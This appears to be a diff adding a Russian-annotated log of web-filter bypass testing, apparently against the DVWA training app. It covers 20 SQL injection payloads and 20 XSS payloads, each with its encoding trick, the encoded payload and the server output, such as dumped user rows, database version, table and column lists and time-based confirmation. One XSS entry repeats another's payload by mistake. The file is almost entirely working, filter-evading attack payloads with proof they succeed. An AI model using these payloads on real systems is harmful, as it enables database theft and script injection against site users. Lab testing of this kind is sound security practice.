@@ -1,0 +1,371 @@
+SQL-инъекции:
+
+1. ' OR 1=1--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' OR 1=1--
+	Payload: \\'+OR+1=1--%0b
+	Status: 200
+	Indicators: 
+	<br />First name: admin<br />Surname: admin</pre><pre>ID: \\' OR 1=1--
+	<br />First name: Gordon<br />Surname: Brown</pre><pre>ID: \\' OR 1=1--
+	<br />First name: Hack<br />Surname: Me</pre><pre>ID: \\' OR 1=1--
+	<br />First name: Pablo<br />Surname: Picasso</pre><pre>ID: \\' OR 1=1--
+	<br />First name: Bob<br />Surname: Smith</pre>
+
+	Technique: Пробелы заменены на %23%0a, OR заменен на ||, после нагрузки %0b
+	Original: ' OR 1=1--
+	Payload: '%23%0a||%23%0a1%23%0a%3d%23%0a1--%0b
+	Status: 200
+	Indicators: 
+	'1'='1<br />First name: admin<br />Surname: admin</pre><pre>ID: '#
+	||#
+	'1'='1<br />First name: Gordon<br />Surname: Brown</pre><pre>ID: '#
+	||#
+	'1'='1<br />First name: Hack<br />Surname: Me</pre><pre>ID: '#
+	||#
+	'1'='1<br />First name: Pablo<br />Surname: Picasso</pre><pre>ID: '#
+	||#
+	'1'='1<br />First name: Bob<br />Surname: Smith</pre>
+
+
+2. ' OR '1'='1
+
+	Technique: Перед нагрузкой добавлено два бэкслэша, также заменены пробелы на плюсы.
+	Original: ' OR '1'='1
+	Payload: \\'+OR+'1'='1
+	Status: 200
+	Indicators: <pre>ID: \\' OR '1'='1<br />First name: admin<br />Surname: admin</pre><pre>ID: \\' OR '1'='1<br />First name: Gordon<br />Surname: Brown</pre><pre>ID: \\' OR '1'='1<br />First name: Hack<br />Surname: Me</pre><pre>ID: \\' OR '1'='1<br />First name: Pablo<br />Surname: Picasso</pre><pre>ID: \\' OR '1'='1<br />First name: Bob<br />Surname: Smith</pre>
+
+	Technique: Пробелы заменены на %23%0a, OR заменен на ||, равно заменено на %3d
+	Original: ' OR '1'='1
+	Payload: '%23%0a||%23%0a'1'%3d'1
+	Status: 200
+	Indicators: <pre>ID: \\' OR '1'='1<br />First name: admin<br />Surname: admin</pre><pre>ID: \\' OR '1'='1<br />First name: Gordon<br />Surname: Brown</pre><pre>ID: \\' OR '1'='1<br />First name: Hack<br />Surname: Me</pre><pre>ID: \\' OR '1'='1<br />First name: Pablo<br />Surname: Picasso</pre><pre>ID: \\' OR '1'='1<br />First name: Bob<br />Surname: Smith</pre>
+
+3. ' UNION SELECT null, null--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' UNION SELECT null, null--
+	Payload: \\'+union+select+null,null--%0b
+	Status: 200
+	Indicators: <pre>ID: \\' union select null,null--
+	<br />First name: <br />Surname: </pre>
+
+4. ' UNION SELECT 1, @@version--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' UNION SELECT 1, @@version--
+	Payload: \\'+union+select+1,@@version--%0b
+	Status: 200
+	Indicators: <pre>ID: \\' union select 1,@@version--
+	<br />First name: 1<br />Surname: 10.1.26-MariaDB-0+deb9u1</pre>
+
+
+5. ' UNION SELECT 1, table_name FROM information_schema.tables--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' UNION SELECT 1, table_name FROM information_schema.tables--
+	Payload: \\'+union+select+1,table_name+FROM+information_schema.tables--%0b
+	Status: 200
+	Indicators: <pre>ID: \\' union select 1,table_name FROM information_schema.tables--
+	<br />First name: 1<br />Surname: guestbook</pre><pre>ID: \\' union select 1,table_name FROM information_schema.tables--
+	<br />First name: 1<br />Surname: users</pre><pre>ID: \\' union select 1,table_name FROM information_schema.tables--
+	<br />First name: 1<br />Surname: ALL_PLUGINS</pre><pre>ID: \\' union select 1,table_name FROM information_schema.tables--
+	<br />First name: 1<br />Surname: APPLICABLE_ROLES</pre><pre>ID: \\' union select 1,table_name FROM information_schema.tables--
+	<br />First name: 1<br />Surname: CHARACTER_SETS</pre><pre>ID: \\' union select 1,table_name FROM information_schema.tables--
+	<br />First name: 1<br />Surname: COLLATIONS</pre><pre>ID: \\' union select 1,table_name FROM information_schema.tables--
+	<br />First name: 1<br />Surname: COLLATION_CHARACTER_SET_APPLICABILITY</pre><pre>ID: \\' union select 1,table_name FROM information_schema.tables--
+	<br />First name: 1<br />Surname: COLUMNS</pre><pre>ID: \\' union select 1,table_name FROM information_schema.tables--
+	<br />First name: 1<br />Surname: COLUMN_PRIVILEGES</pre><pre>ID: \\' union select 1,table_name FROM information_schema.tables--
+	...
+
+6. ' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--
+	Payload: \\'UNION+SELECT+1,+column_name+FROM+information_schema.columns+WHERE+table_name%3d'users'--%0b
+	Status: 200
+	Indicators: <pre>ID: \\'UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--
+	<br />First name: 1<br />Surname: user_id</pre><pre>ID: \\'UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--
+	<br />First name: 1<br />Surname: first_name</pre><pre>ID: \\'UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--
+	<br />First name: 1<br />Surname: last_name</pre><pre>ID: \\'UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--
+	<br />First name: 1<br />Surname: user</pre><pre>ID: \\'UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--
+	...
+
+7. ' UNION SELECT username, password FROM users--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' UNION SELECT username, password FROM users--
+	Payload: \\'+UNION+SELECT+username,+password+FROM+users--%0b
+	Status: 200
+	Indicators: <pre>Unknown column 'username' in 'field list'</pre>
+
+8. ' AND SLEEP(5)--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' AND SLEEP(5)--
+	Payload: \\'+AND+SLEEP(5)--%0b
+	Status: 200
+	Indicators: заснул на 0 секунд так как AND. заменяли and на or, увидели что система зависает на указанное время
+
+	Technique: Пробелы заменены на %23%0a, в конце нагрузки %0b
+	Original: ' AND SLEEP(5)--
+	Payload: '%23%0aAND%23%0aSLEEP%23%0a(5)--%0b
+	Status: 200
+	Indicators: заснул на 0 секунд так как AND. заменяли and на or, увидели что система зависает на указанное время
+
+9. '; DROP TABLE users--
+
+
+
+10. ' OR 1=1 LIMIT 1--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' OR 1=1 LIMIT 1--
+	Payload: \\'+OR+1=1+LIMIT+1--%0b
+	Status: 200
+	Indicators: 	<pre>ID: \\' OR 1=1 LIMIT 1--
+	<br />First name: admin<br />Surname: admin</pre>
+
+	Technique: Пробелы заменены на %23%0a, OR заменен на ||, равно заменено на %3d, после нагрузки %0b
+	Original: ' OR 1=1 LIMIT 1--
+	Payload: '%23%0a||%23%0a1%23%0a%3d%23%0a1%23%0alimit%23%0a1--%0b
+	Status: 200
+	Indicators: 	<pre>ID: \\' OR 1=1 LIMIT 1--
+	<br />First name: admin<br />Surname: admin</pre>
+
+11. ' ORDER BY 1--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' ORDER BY 1--
+	Payload: \\'+ORDER+BY+1--%0b
+	Status: 200
+	Indicators: нет индикатора
+
+	Technique: Пробелы заменены на %23%0a, после нагрузки %0b
+	Original: ' ORDER BY 1--
+	Payload: '%23%0aORDER%23%0aBY%23%0a1--%0b
+	Status: 200
+	Indicators: нет индикатора
+
+12. ' ORDER BY 3--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' ORDER BY 3--
+	Payload: \\'+ORDER+BY+3--%0b
+	Status: 200
+	Indicators: <pre>Unknown column '3' in 'order clause'</pre>
+
+	Technique: Пробелы заменены на %23%0a, после нагрузки %0b
+	Original: ' ORDER BY 3--
+	Payload: '%23%0aORDER%23%0aBY%23%0a3--%0b
+	Status: 200
+	Indicators: <pre>Unknown column '3' in 'order clause'</pre>
+
+13. ' AND (SELECT COUNT(*) FROM users) > 0--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' AND (SELECT COUNT(*) FROM users) > 0--
+	Payload: \\'AND+(SELECT+COUNT(*)+FROM+users)+>+0--%0b
+	Status: 200
+	Indicators: нет индикатора(булин)
+
+14. ' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 65--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 65--
+	Payload: \\'+AND+ASCII(SUBSTRING((SELECT+password+FROM+users+LIMIT+1),1,1))+>+65--%0b
+	Status: 200
+	Indicators: нет индикатора(булин)
+
+15. ' UNION SELECT 1, LOAD_FILE('/etc/passwd')--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' UNION SELECT 1, LOAD_FILE('/etc/passwd')--
+	Payload: \\'+UNION+SELECT+1,+LOAD_FILE('/etc/passwd')--%0b
+	Status: 200
+	Indicators: 	<pre>ID: \\' UNION SELECT 1, LOAD_FILE('/etc/passwd')--
+	<br />First name: 1<br />Surname: </pre>
+
+16. ' UNION SELECT 1, user()--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' UNION SELECT 1, user()--
+	Payload: \\'+UNION+SELECT+1,+user()--%0b
+	Status: 200
+	Indicators: <pre>ID: \\' UNION SELECT 1, user()--
+	<br />First name: 1<br />Surname: app@localhost</pre>
+
+17. ' UNION SELECT 1, database()--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' UNION SELECT 1, database()--
+	Payload: \\'+UNION+SELECT+1,+database()--%0b
+	Status: 200
+	Indicators: 	<pre>ID: \\' UNION SELECT 1, database()--
+	<br />First name: 1<br />Surname: dvwa</pre>
+
+18. ' AND 1=IF(1=1, SLEEP(3), 0)--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' AND 1=IF(1=1, SLEEP(3), 0)--
+	Payload: \\'+AND+1%3dIF(1%3d1,+SLEEP(3),+0)--%0b
+	Status: 200
+	Indicators: заснул на 0 секунд так как AND. заменяли and на or, увидели что система зависает на указанное время
+
+19. ' OR EXISTS(SELECT * FROM users WHERE username='admin')--
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' OR EXISTS(SELECT * FROM users WHERE username='admin')--
+	Payload: \\'+OR+EXISTS(SELECT+*+FROM+users+WHERE+username%3d'admin')--%0b
+	Status: 200
+	Indicators: <pre>Unknown column 'username' in 'where clause'</pre>
+
+20. ' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()—
+
+	Technique: Перед нагрузкой добавлено два бэкслэша и после нагрузки %0b, также заменены пробелы на плюсы.
+	Original: ' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()—
+	Payload: \\'+UNION+SELECT+group_concat(table_name),2+FROM+information_schema.tables+WHERE+table_schema%3ddatabase()--%0b
+	Status: 200
+	Indicators: 	<pre>ID: \\' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()--
+	<br />First name: guestbook,users<br />Surname: 2</pre>
+
+
+XSS:
+
+1. <script>alert(1)</script>
+
+	Technique: Добавлено <%3f перед нагрузкой
+	Original: <script>alert(1)</script>
+	Payload: <%3f<script>alert(1)</script>
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
+
+2. <img src=x onerror=alert(1)>
+
+	Technique: Пробелы заменены на %20"&quot;"%20
+	Original: <img src=x onerror=alert(1)>
+	Payload: <img%20"&quot;"%20src=x%20"&quot;"%20onerror=alert(1)>
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
+
+3. <svg onload=alert(1)>
+
+	Technique: Пробелы заменены на %20"&quot;"%20
+	Original: <svg onload=alert(1)>
+	Payload: <svg%20"&quot;"%20onload=alert(1)>
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
+
+4. <body onload=alert(1)>
+
+	Technique: Пробелы заменены на %20"&quot;"%20
+	Original: <body onload=alert(1)>
+	Payload: <body%20"&quot;"%20onload=alert(1)>
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
+
+5. <iframe src="javascript:alert(1)">
+
+
+
+6. <a href="javascript:alert(1)">click</a>
+
+	Technique: Пробелы заменены на %20"&quot;"%20
+	Original: <a href="javascript:alert(1)">click</a>
+	Payload: <a%20"&quot;"%20href="javascript:alert(1)">click</a>
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
+
+7. <input onfocus=alert(1) autofocus>
+
+	Technique: Пробелы заменены на %20"&quot;"%20
+	Original: <input onfocus=alert(1) autofocus>
+	Payload: <input%20"&quot;"%20onfocus=alert(1)%20"&quot;"%20autofocus>
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
+
+8. <details open ontoggle=alert(1)>
+
+	Technique: Пробелы заменены на %20"&quot;"%20
+	Original: <details open ontoggle=alert(1)>
+	Payload: <details%20"&quot;"%20open%20"&quot;"%20ontoggle=alert(1)>
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
+
+9. <marquee onstart=alert(1)>
+
+	Technique: Пробелы заменены на %20"&quot;"%20
+	Original: <marquee onstart=alert(1)>
+	Payload: <marqueeна %20"&quot;"%20onstart=alert(1)>
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
+
+10. "><script>alert(1)</script>
+
+
+
+11. ' onmouseover=alert(1) '
+
+	Technique: Пробелы заменены на %20"&quot;"%20
+	Original: ' onmouseover=alert(1) '
+	Payload: '%20"&quot;"%20onmouseover=alert(1)%20"&quot;"%20'
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
+
+12. <x onclick="alert(1)">click</x>
+
+	Technique: Пробелы заменены на %20"&quot;"%20
+	Original: <x onclick="alert(1)">click</x>
+	Payload: <x%20"&quot;"%20onclick="alert(1)">click</x>
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
+
+13. <div style="background:url('javascript:alert(1)')">
+
+
+
+14. <object data="javascript:alert(1)">
+
+	Technique: Добавлено <%3f перед нагрузкой
+	Original: <object data="javascript:alert(1)">
+	Payload: <%3f<object%20data="javascript:alert(1)">
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
+
+15. <embed src="data:text/html,<script>alert(1)</script>">
+
+
+
+16. <form action="javascript:alert(1)"><input type=submit>
+
+	Technique: Пробелы заменены на %20"&quot;"%20
+	Original: <form action="javascript:alert(1)"><input type=submit>
+	Payload: <form%20"&quot;"%20action="javascript:alert(1)"><input%20"&quot;"%20type=submit>
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
+
+17. <isindex action="javascript:alert(1)" type=image>
+
+
+
+18. <xss style="background:url('javascript:alert(1)')">
+
+
+
+19. <math><brute href="javascript:alert(1)">click</brute></math>
+
+	Technique: Пробелы заменены на %20"&quot;"%20
+	Original: <form action="javascript:alert(1)"><input type=submit>
+	Payload: <form%20"&quot;"%20action="javascript:alert(1)"><input%20"&quot;"%20type=submit>
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
+
+20. <video><source onerror="javascript:alert(1)">
+
+	Technique: Пробелы заменены на %20"&quot;"%20
+	Original: <video><source onerror="javascript:alert(1)">
+	Payload: <video><source%20"&quot;"%20onerror="javascript:alert(1)">
+	Status: 200
+	Indicators: проверили в браузере, что отрабатывает alert(1)
